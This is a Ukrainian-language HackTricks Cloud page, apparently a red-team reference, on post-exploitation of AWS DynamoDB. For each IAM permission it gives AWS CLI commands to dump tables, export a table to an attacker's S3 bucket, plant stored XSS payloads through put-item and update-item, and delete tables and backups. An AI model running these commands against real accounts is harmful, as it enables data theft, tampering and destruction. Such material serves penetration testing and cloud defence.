# AWS - –ü—ñ—Å–ª—è–µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è DynamoDB

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ —Å–≤–æ—é **–∫–æ–º–ø–∞–Ω—ñ—é –≤ —Ä–µ–∫–ª–∞–º—ñ –Ω–∞ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É —Ñ–æ—Ä–º–∞—Ç—ñ PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) **—ñ** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **—Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ GitHub**.

</details>

## DynamoDB

–î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø–µ—Ä–µ–≥–ª—è–Ω—å—Ç–µ:

{% content-ref url="../aws-services/aws-databases/aws-dynamodb-enum.md" %}
[aws-dynamodb-enum.md](../aws-services/aws-databases/aws-dynamodb-enum.md)
{% endcontent-ref %}

### `dynamodb:BatchGetItem`

–ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –∑ —Ü–∏–º–∏ –¥–æ–∑–≤–æ–ª–∞–º–∏ –∑–º–æ–∂–µ **–æ—Ç—Ä–∏–º—É–≤–∞—Ç–∏ –µ–ª–µ–º–µ–Ω—Ç–∏ –∑ —Ç–∞–±–ª–∏—Ü—å –∑–∞ –ø–µ—Ä–≤–∏–Ω–Ω–∏–º –∫–ª—é—á–µ–º** (–≤–∏ –Ω–µ –º–æ–∂–µ—Ç–µ –ø—Ä–æ—Å—Ç–æ –∑–∞–ø—Ä–æ—Å–∏—Ç–∏ –≤—Å—ñ –¥–∞–Ω—ñ —Ç–∞–±–ª–∏—Ü—ñ). –¶–µ –æ–∑–Ω–∞—á–∞—î, —â–æ –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –∑–Ω–∞—Ç–∏ –ø–µ—Ä–≤–∏–Ω–Ω—ñ –∫–ª—é—á—ñ (—ó—Ö –º–æ–∂–Ω–∞ –æ—Ç—Ä–∏–º–∞—Ç–∏, –æ—Ç—Ä–∏–º–∞–≤—à–∏ –º–µ—Ç–∞–¥–∞–Ω—ñ —Ç–∞–±–ª–∏—Ü—ñ (`describe-table`).

{% tabs %}
{% tab title="json file" %}
{% code overflow="wrap" %}
```bash
aws dynamodb batch-get-item --request-items file:///tmp/a.json

// With a.json
{
"ProductCatalog" : { // This is the table name
"Keys": [
{
"Id" : { // Primary keys name
"N": "205" // Value to search for, you could put here entries from 1 to 1000 to dump all those
}
}
]
}
}
```
{% endcode %}
{% endtab %}

{% tab title="inline" %}
{% code overflow="wrap" %}
```bash
aws dynamodb batch-get-item \
--request-items '{"TargetTable": {"Keys": [{"Id": {"S": "item1"}}, {"Id": {"S": "item2"}}]}}' \
--region <region>
```
{% endcode %}
{% endtab %}
{% endtabs %}



**–ü–æ—Ç–µ–Ω—Ü—ñ–π–Ω–∏–π –≤–ø–ª–∏–≤:** –ù–µ–ø—Ä—è–º–µ –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ —à–ª—è—Ö–æ–º –∑–Ω–∞—Ö–æ–¥–∂–µ–Ω–Ω—è —á—É—Ç–ª–∏–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –≤ —Ç–∞–±–ª–∏—Ü—ñ

### `dynamodb:GetItem`

**–ê–Ω–∞–ª–æ–≥—ñ—á–Ω–æ –¥–æ –ø–æ–ø–µ—Ä–µ–¥–Ω—ñ—Ö –¥–æ–∑–≤–æ–ª—ñ–≤**, —Ü–µ–π –¥–æ–∑–≤—ñ–ª –¥–æ–∑–≤–æ–ª—è—î –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ–º—É –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫—É —á–∏—Ç–∞—Ç–∏ –∑–Ω–∞—á–µ–Ω–Ω—è –ª–∏—à–µ –∑ 1 —Ç–∞–±–ª–∏—Ü—ñ –∑–∞ –≤–∫–∞–∑–∞–Ω–∏–º –ø–µ—Ä–≤–∏–Ω–Ω–∏–º –∫–ª—é—á–µ–º –∑–∞–ø–∏—Å—É –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è:

{% code overflow="wrap" %}
```json
aws dynamodb get-item --table-name ProductCatalog --key  file:///tmp/a.json

// With a.json
{
"Id" : {
"N": "205"
}
}
```
{% endcode %}

–ó —Ü–∏–º –¥–æ–∑–≤–æ–ª–æ–º —Ç–∞–∫–æ–∂ –º–æ–∂–ª–∏–≤–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –º–µ—Ç–æ–¥ **`transact-get-items`** –Ω–∞—Å—Ç—É–ø–Ω–∏–º —á–∏–Ω–æ–º:
```json
aws dynamodb transact-get-items \
--transact-items file:///tmp/a.json

// With a.json
[
{
"Get": {
"Key": {
"Id": {"N": "205"}
},
"TableName": "ProductCatalog"
}
}
]
```
**–ü–æ—Ç–µ–Ω—Ü—ñ–π–Ω–∏–π –≤–ø–ª–∏–≤:** –ù–µ–ø—Ä—è–º–µ –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ —à–ª—è—Ö–æ–º –∑–Ω–∞—Ö–æ–¥–∂–µ–Ω–Ω—è —á—É—Ç–ª–∏–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –≤ —Ç–∞–±–ª–∏—Ü—ñ

### `dynamodb:Query`

**–°—Ö–æ–∂–µ –Ω–∞ –ø–æ–ø–µ—Ä–µ–¥–Ω—ñ –¥–æ–∑–≤–æ–ª–∏**, —Ü–µ–π –¥–æ–∑–≤—ñ–ª –¥–æ–∑–≤–æ–ª—è—î –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ–º—É –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫—É —á–∏—Ç–∞—Ç–∏ –∑–Ω–∞—á–µ–Ω–Ω—è –ª–∏—à–µ –∑ 1 —Ç–∞–±–ª–∏—Ü—ñ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –ø–µ—Ä–≤–∏–Ω–Ω–æ–≥–æ –∫–ª—é—á–∞ –∑–∞–ø–∏—Å—É –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è. –¶–µ –¥–æ–∑–≤–æ–ª—è—î –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ [–ø—ñ–¥–º–Ω–æ–∂–∏–Ω—É –ø–æ—Ä—ñ–≤–Ω—è–Ω—å](https://docs.aws.amazon.com/amazondynamodb/latest/APIReference/API\_Condition.html), –∞–ª–µ —î–¥–∏–Ω–µ –ø–æ—Ä—ñ–≤–Ω—è–Ω–Ω—è, –¥–æ–∑–≤–æ–ª–µ–Ω–µ –∑ –ø–µ—Ä–≤–∏–Ω–Ω–∏–º –∫–ª—é—á–µ–º (—è–∫–µ –ø–æ–≤–∏–Ω–Ω–æ –±—É—Ç–∏ –≤–∫–∞–∑–∞–Ω–æ), - —Ü–µ "EQ", —Ç–æ–º—É –≤–∏ –Ω–µ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –ø–æ—Ä—ñ–≤–Ω—è–Ω–Ω—è –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –≤—Å—ñ—î—ó –±–∞–∑–∏ –¥–∞–Ω–∏—Ö –∑–∞ –æ–¥–Ω–∏–º –∑–∞–ø–∏—Ç–æ–º.

{% tabs %}
{% tab title="json file" %}
{% code overflow="wrap" %}
```bash
aws dynamodb query --table-name ProductCatalog --key-conditions file:///tmp/a.json

// With a.json
{
"Id" : {
"ComparisonOperator":"EQ",
"AttributeValueList": [ {"N": "205"} ]
}
}
```
{% endcode %}
{% endtab %}

{% tab title="inline" %}
```bash
aws dynamodb query \
--table-name TargetTable \
--key-condition-expression "AttributeName = :value" \
--expression-attribute-values '{":value":{"S":"TargetValue"}}' \
--region <region>
```
{% endtab %}
{% endtabs %}

**–ü–æ—Ç–µ–Ω—Ü—ñ–π–Ω–∏–π –≤–ø–ª–∏–≤:** –ù–µ–ø—Ä—è–º–µ –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ —à–ª—è—Ö–æ–º –∑–Ω–∞—Ö–æ–¥–∂–µ–Ω–Ω—è —á—É—Ç–ª–∏–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –≤ —Ç–∞–±–ª–∏—Ü—ñ

### `dynamodb:Scan`

–í–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ü–µ –¥–æ–∑–≤—ñ–ª –¥–ª—è **–ª–µ–≥–∫–æ–≥–æ –≤–∏–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –≤—Å—ñ—î—ó —Ç–∞–±–ª–∏—Ü—ñ**.
```bash
aws dynamodb scan --table-name <t_name> #Get data inside the table
```
**–ü–æ—Ç–µ–Ω—Ü—ñ–π–Ω–∏–π –≤–ø–ª–∏–≤:** –ù–µ–ø—Ä—è–º–µ –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ —à–ª—è—Ö–æ–º –∑–Ω–∞—Ö–æ–¥–∂–µ–Ω–Ω—è —á—É—Ç–ª–∏–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –≤ —Ç–∞–±–ª–∏—Ü—ñ

### `dynamodb:PartiQLSelect`

–í–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ü–µ –¥–æ–∑–≤—ñ–ª –¥–ª—è **–ª–µ–≥–∫–æ–≥–æ –≤–∏–≤–µ–¥–µ–Ω–Ω—è –≤—Å—ñ—î—ó —Ç–∞–±–ª–∏—Ü—ñ**.
```bash
aws dynamodb execute-statement \
--statement "SELECT * FROM ProductCatalog"
```
–¶–µ –¥–æ–∑–≤—ñ–ª —Ç–∞–∫–æ–∂ –¥–æ–∑–≤–æ–ª—è—î –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ `batch-execute-statement`, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥:
```bash
aws dynamodb batch-execute-statement \
--statements '[{"Statement": "SELECT * FROM ProductCatalog WHERE Id = 204"}]'
```
–∞–ª–µ –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –≤–∫–∞–∑–∞—Ç–∏ –ø–µ—Ä–≤–∏–Ω–Ω–∏–π –∫–ª—é—á –∑—ñ –∑–Ω–∞—á–µ–Ω–Ω—è–º, —Ç–æ–º—É —Ü–µ –Ω–µ —Ç–∞–∫ –∫–æ—Ä–∏—Å–Ω–æ.

**–ü–æ—Ç–µ–Ω—Ü—ñ–π–Ω–∏–π –≤–ø–ª–∏–≤:** –ù–µ–ø—Ä—è–º–µ –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ —à–ª—è—Ö–æ–º –∑–Ω–∞—Ö–æ–¥–∂–µ–Ω–Ω—è —á—É—Ç–ª–∏–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –≤ —Ç–∞–±–ª–∏—Ü—ñ

### `dynamodb:ExportTableToPointInTime|(dynamodb:UpdateContinuousBackups)`

–¶—è –¥–æ–∑–≤—ñ–ª –¥–æ–∑–≤–æ–ª–∏—Ç—å –∞—Ç–∞–∫—É—é—á–æ–º—É **–µ–∫—Å–ø–æ—Ä—Ç—É–≤–∞—Ç–∏ –≤—Å—é —Ç–∞–±–ª–∏—Ü—é –≤ –≤–∏–±—Ä–∞–Ω–µ –Ω–∏–º –≤—ñ–¥—Ä–æ S3**:
```bash
aws dynamodb export-table-to-point-in-time \
--table-arn arn:aws:dynamodb:<region>:<account-id>:table/TargetTable \
--s3-bucket <attacker_s3_bucket> \
--s3-prefix <optional_prefix> \
--export-time <point_in_time> \
--region <region>
```
–ó–∞—É–≤–∞–∂—Ç–µ, —â–æ –¥–ª—è —Ü—å–æ–≥–æ –ø–æ—Ç—Ä—ñ–±–Ω–æ, —â–æ–± —É —Ç–∞–±–ª–∏—Ü—ñ –±—É–ª–∞ —É–≤—ñ–º–∫–Ω–µ–Ω–∞ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –≤—ñ–¥–Ω–æ–≤–ª–µ–Ω–Ω—è –¥–æ –ø–µ–≤–Ω–æ–≥–æ –º–æ–º–µ–Ω—Ç—É –≤ —á–∞—Å—ñ. –í–∏ –º–æ–∂–µ—Ç–µ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏, —á–∏ —Ü—è –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å —É–≤—ñ–º–∫–Ω–µ–Ω–∞ –¥–ª—è —Ç–∞–±–ª–∏—Ü—ñ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –Ω–∞—Å—Ç—É–ø–Ω–æ—ó –∫–æ–º–∞–Ω–¥–∏:
```bash
aws dynamodb describe-continuous-backups \
--table-name <tablename>
```
–Ø–∫—â–æ —Ü–µ –Ω–µ —É–≤—ñ–º–∫–Ω–µ–Ω–æ, –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ **—É–≤—ñ–º–∫–Ω—É—Ç–∏ —Ü–µ**, —ñ –¥–ª—è —Ü—å–æ–≥–æ –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –¥–æ–∑–≤—ñ–ª **`dynamodb:ExportTableToPointInTime`**:
```bash
aws dynamodb update-continuous-backups \
--table-name <value> \
--point-in-time-recovery-specification PointInTimeRecoveryEnabled=true
```
**–ü–æ—Ç–µ–Ω—Ü—ñ–π–Ω–∏–π –≤–ø–ª–∏–≤:** –ù–µ–ø—Ä—è–º–µ –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ —à–ª—è—Ö–æ–º –∑–Ω–∞—Ö–æ–¥–∂–µ–Ω–Ω—è —á—É—Ç–ª–∏–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –≤ —Ç–∞–±–ª–∏—Ü—ñ

### `dynamodb:CreateTable`, `dynamodb:RestoreTableFromBackup`, (`dynamodb:CreateBackup)`

–ó —Ü–∏–º–∏ –¥–æ–∑–≤–æ–ª–∞–º–∏ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –∑–º–æ–∂–µ **—Å—Ç–≤–æ—Ä–∏—Ç–∏ –Ω–æ–≤—É —Ç–∞–±–ª–∏—Ü—é –∑ —Ä–µ–∑–µ—Ä–≤–Ω–æ—ó –∫–æ–ø—ñ—ó** (–∞–±–æ –Ω–∞–≤—ñ—Ç—å —Å—Ç–≤–æ—Ä–∏—Ç–∏ —Ä–µ–∑–µ—Ä–≤–Ω—É –∫–æ–ø—ñ—é, —â–æ–± –ø–æ—Ç—ñ–º –≤—ñ–¥–Ω–æ–≤–∏—Ç–∏ —ó—ó –≤ —ñ–Ω—à—ñ–π —Ç–∞–±–ª–∏—Ü—ñ). –ü–æ—Ç—ñ–º, –º–∞—é—á–∏ –Ω–µ–æ–±—Ö—ñ–¥–Ω—ñ –¥–æ–∑–≤–æ–ª–∏, –≤—ñ–Ω –∑–º–æ–∂–µ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ **—ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é** –∑ —Ä–µ–∑–µ—Ä–≤–Ω–∏—Ö –∫–æ–ø—ñ–π, —è–∫–∞ **–º–æ–∂–µ –≤–∂–µ –Ω–µ –±—É—Ç–∏ –≤ –ø—Ä–æ–¥—É–∫—Ü—ñ–π–Ω—ñ–π** —Ç–∞–±–ª–∏—Ü—ñ.
```bash
aws dynamodb restore-table-from-backup \
--backup-arn <source-backup-arn> \
--target-table-name <new-table-name> \
--region <region>
```
**–ü–æ—Ç–µ–Ω—Ü—ñ–π–Ω–∏–π –≤–ø–ª–∏–≤:** –ù–µ–ø—Ä—è–º–µ –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ —à–ª—è—Ö–æ–º –∑–Ω–∞—Ö–æ–¥–∂–µ–Ω–Ω—è —á—É—Ç–ª–∏–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –≤ —Ä–µ–∑–µ—Ä–≤–Ω—ñ–π –∫–æ–ø—ñ—ó —Ç–∞–±–ª–∏—Ü—ñ

### `dynamodb:PutItem`

–¶—è –¥–æ–∑–≤—ñ–ª –¥–æ–∑–≤–æ–ª—è—î –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º **–¥–æ–¥–∞–≤–∞—Ç–∏ –Ω–æ–≤–∏–π –µ–ª–µ–º–µ–Ω—Ç –¥–æ —Ç–∞–±–ª–∏—Ü—ñ –∞–±–æ –∑–∞–º—ñ–Ω—é–≤–∞—Ç–∏ —ñ—Å–Ω—É—é—á–∏–π –µ–ª–µ–º–µ–Ω—Ç** –Ω–∞ –Ω–æ–≤–∏–π –µ–ª–µ–º–µ–Ω—Ç. –Ø–∫—â–æ –µ–ª–µ–º–µ–Ω—Ç –∑ —Ç–∞–∫–∏–º –∂–µ –æ—Å–Ω–æ–≤–Ω–∏–º –∫–ª—é—á–µ–º –≤–∂–µ —ñ—Å–Ω—É—î, **–≤–µ—Å—å –µ–ª–µ–º–µ–Ω—Ç –±—É–¥–µ –∑–∞–º—ñ–Ω–µ–Ω–∏–π** –Ω–∞ –Ω–æ–≤–∏–π –µ–ª–µ–º–µ–Ω—Ç. –Ø–∫—â–æ –æ—Å–Ω–æ–≤–Ω–∏–π –∫–ª—é—á –Ω–µ —ñ—Å–Ω—É—î, –±—É–¥–µ **—Å—Ç–≤–æ—Ä–µ–Ω–æ** –Ω–æ–≤–∏–π –µ–ª–µ–º–µ–Ω—Ç –∑ –≤–∫–∞–∑–∞–Ω–∏–º –æ—Å–Ω–æ–≤–Ω–∏–º –∫–ª—é—á–µ–º.

{% tabs %}
{% tab title="–ü—Ä–∏–∫–ª–∞–¥ XSS" %}
{% code overflow="wrap" %}
```bash
## Create new item with XSS payload
aws dynamodb put-item --table <table_name> --item file://add.json
### With add.json:
{
"Id": {
"S": "1000"
},
"Name": {
"S":  "Marc"
},
"Description": {
"S": "<script>alert(1)</script>"
}
}
```
{% endcode %}
{% endtab %}

{% tab title="–ü—Ä–∏–∫–ª–∞–¥ —à—Ç—É—á–Ω–æ–≥–æ —ñ–Ω—Ç–µ–ª–µ–∫—Ç—É" %}
```bash
aws dynamodb put-item \
--table-name ExampleTable \
--item '{"Id": {"S": "1"}, "Attribute1": {"S": "Value1"}, "Attribute2": {"S": "Value2"}}' \
--region <region>
```
{% endtab %}
{% endtabs %}

**–ü–æ—Ç–µ–Ω—Ü—ñ–π–Ω–∏–π –≤–ø–ª–∏–≤:** –í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –ø–æ–¥–∞–ª—å—à–∏—Ö –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π/–æ–±—Ö—ñ–¥—ñ–≤ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –º–æ–∂–ª–∏–≤–æ—Å—Ç—ñ –¥–æ–¥–∞–≤–∞–Ω–Ω—è/–∑–º—ñ–Ω–∏ –¥–∞–Ω–∏—Ö –≤ —Ç–∞–±–ª–∏—Ü—ñ DynamoDB

### `dynamodb:UpdateItem`

–¶—è –¥–æ–∑–≤—ñ–ª –¥–æ–∑–≤–æ–ª—è—î –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º **–∑–º—ñ–Ω—é–≤–∞—Ç–∏ —ñ—Å–Ω—É—é—á—ñ –∞—Ç—Ä–∏–±—É—Ç–∏ –µ–ª–µ–º–µ–Ω—Ç–∞ –∞–±–æ –¥–æ–¥–∞–≤–∞—Ç–∏ –Ω–æ–≤—ñ –∞—Ç—Ä–∏–±—É—Ç–∏ –¥–æ –µ–ª–µ–º–µ–Ω—Ç–∞**. –í—ñ–Ω **–Ω–µ –∑–∞–º—ñ–Ω—é—î** –≤–µ—Å—å –µ–ª–µ–º–µ–Ω—Ç; –≤—ñ–Ω –ª–∏—à–µ –æ–Ω–æ–≤–ª—é—î –≤–∫–∞–∑–∞–Ω—ñ –∞—Ç—Ä–∏–±—É—Ç–∏. –Ø–∫—â–æ –ø–µ—Ä–≤–∏–Ω–Ω–∏–π –∫–ª—é—á –Ω–µ —ñ—Å–Ω—É—î –≤ —Ç–∞–±–ª–∏—Ü—ñ, –æ–ø–µ—Ä–∞—Ü—ñ—è —Å—Ç–≤–æ—Ä–∏—Ç—å **–Ω–æ–≤–∏–π –µ–ª–µ–º–µ–Ω—Ç** –∑ –≤–∫–∞–∑–∞–Ω–∏–º –ø–µ—Ä–≤–∏–Ω–Ω–∏–º –∫–ª—é—á–µ–º —Ç–∞ –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –∞—Ç—Ä–∏–±—É—Ç–∏, –≤–∫–∞–∑–∞–Ω—ñ –≤ –≤–∏—Ä–∞–∑—ñ –æ–Ω–æ–≤–ª–µ–Ω–Ω—è.
```bash
## Update item with XSS payload
aws dynamodb update-item --table <table_name> \
--key file://key.json --update-expression "SET Description = :value" \
--expression-attribute-values file://val.json
### With key.json:
{
"Id": {
"S": "1000"
}
}
### and val.json
{
":value": {
"S": "<script>alert(1)</script>"
}
}
```
{% endcode %}
{% endtab %}

{% tab title="–ü—Ä–∏–∫–ª–∞–¥ —à—Ç—É—á–Ω–æ–≥–æ —ñ–Ω—Ç–µ–ª–µ–∫—Ç—É" %}
```bash
aws dynamodb update-item \
--table-name ExampleTable \
--key '{"Id": {"S": "1"}}' \
--update-expression "SET Attribute1 = :val1, Attribute2 = :val2" \
--expression-attribute-values '{":val1": {"S": "NewValue1"}, ":val2": {"S": "NewValue2"}}' \
--region <region>
```
**–ü–æ—Ç–µ–Ω—Ü—ñ–π–Ω–∏–π –≤–ø–ª–∏–≤:** –í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –ø–æ–¥–∞–ª—å—à–∏—Ö –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π/–æ–±—Ö—ñ–¥—ñ–≤ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –º–æ–∂–ª–∏–≤–æ—Å—Ç—ñ –¥–æ–¥–∞–≤–∞–Ω–Ω—è/–∑–º—ñ–Ω–∏ –¥–∞–Ω–∏—Ö –≤ —Ç–∞–±–ª–∏—Ü—ñ DynamoDB

### `dynamodb:DeleteTable`

–ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –∑ —Ü–∏–º –¥–æ–∑–≤–æ–ª–æ–º –º–æ–∂–µ **–≤–∏–¥–∞–ª–∏—Ç–∏ —Ç–∞–±–ª–∏—Ü—é DynamoDB, —â–æ –ø—Ä–∏–∑–≤–µ–¥–µ –¥–æ –≤—Ç—Ä–∞—Ç–∏ –¥–∞–Ω–∏—Ö**.
```bash
aws dynamodb delete-table \
--table-name TargetTable \
--region <region>
```
**–ü–æ—Ç–µ–Ω—Ü—ñ–π–Ω–∏–π –≤–ø–ª–∏–≤**: –í—Ç—Ä–∞—Ç–∞ –¥–∞–Ω–∏—Ö —Ç–∞ –ø–æ—Ä—É—à–µ–Ω–Ω—è –ø–æ—Å–ª—É–≥, —è–∫—ñ –∑–∞–ª–µ–∂–∞—Ç—å –≤—ñ–¥ –≤–∏–¥–∞–ª–µ–Ω–æ—ó —Ç–∞–±–ª–∏—Ü—ñ.

### `dynamodb:DeleteBackup`

–ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –∑ —Ü–∏–º –¥–æ–∑–≤–æ–ª–æ–º –º–æ–∂–µ **–≤–∏–¥–∞–ª–∏—Ç–∏ —Ä–µ–∑–µ—Ä–≤–Ω—É –∫–æ–ø—ñ—é DynamoDB, —â–æ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ –º–æ–∂–µ –ø—Ä–∏–∑–≤–µ—Å—Ç–∏ –¥–æ –≤—Ç—Ä–∞—Ç–∏ –¥–∞–Ω–∏—Ö —É –≤–∏–ø–∞–¥–∫—É –≤—ñ–¥–Ω–æ–≤–ª–µ–Ω–Ω—è –ø—ñ—Å–ª—è –∞–≤–∞—Ä—ñ—ó**.
```bash
aws dynamodb delete-backup \
--backup-arn arn:aws:dynamodb:<region>:<account-id>:table/TargetTable/backup/BACKUP_ID \
--region <region>
```
**–ü–æ—Ç–µ–Ω—Ü—ñ–π–Ω–∏–π –≤–ø–ª–∏–≤**: –í—Ç—Ä–∞—Ç–∞ –¥–∞–Ω–∏—Ö —Ç–∞ –Ω–µ–º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –≤—ñ–¥–Ω–æ–≤–ª–µ–Ω–Ω—è –∑ —Ä–µ–∑–µ—Ä–≤–Ω–æ—ó –∫–æ–ø—ñ—ó –ø—ñ–¥ —á–∞—Å —Å—Ü–µ–Ω–∞—Ä—ñ—é –≤—ñ–¥–Ω–æ–≤–ª–µ–Ω–Ω—è –ø—ñ—Å–ª—è –∞–≤–∞—Ä—ñ—ó.

### `dynamodb:StreamSpecification`, `dynamodb:UpdateTable`, `dynamodb:DescribeStream`, `dynamodb:GetShardIterator`, `dynamodb:GetRecords`

{% hint style="info" %}
TODO: –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ, —á–∏ —Ü–µ –¥—ñ–π—Å–Ω–æ –ø—Ä–∞—Ü—é—î
{% endhint %}

–ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –∑ —Ü–∏–º–∏ –¥–æ–∑–≤–æ–ª–∞–º–∏ –º–æ–∂–µ **—É–≤—ñ–º–∫–Ω—É—Ç–∏ –ø–æ—Ç—ñ–∫ –Ω–∞ —Ç–∞–±–ª–∏—Ü—ñ DynamoDB, –æ–Ω–æ–≤–∏—Ç–∏ —Ç–∞–±–ª–∏—Ü—é –¥–ª—è –ø–æ—á–∞—Ç–∫—É –ø–æ—Ç–æ–∫–æ–≤–æ–≥–æ –≤—ñ–¥—Ç–≤–æ—Ä–µ–Ω–Ω—è –∑–º—ñ–Ω, –∞ –ø–æ—Ç—ñ–º –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ –ø–æ—Ç–æ–∫—É –¥–ª—è –º–æ–Ω—ñ—Ç–æ—Ä–∏–Ω–≥—É –∑–º—ñ–Ω –≤ —Ç–∞–±–ª–∏—Ü—ñ –≤ —Ä–µ–∞–ª—å–Ω–æ–º—É —á–∞—Å—ñ**. –¶–µ –¥–æ–∑–≤–æ–ª—è—î –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫—É –º–æ–Ω—ñ—Ç–æ—Ä–∏—Ç–∏ —Ç–∞ –≤–∏–≤–æ–¥–∏—Ç–∏ 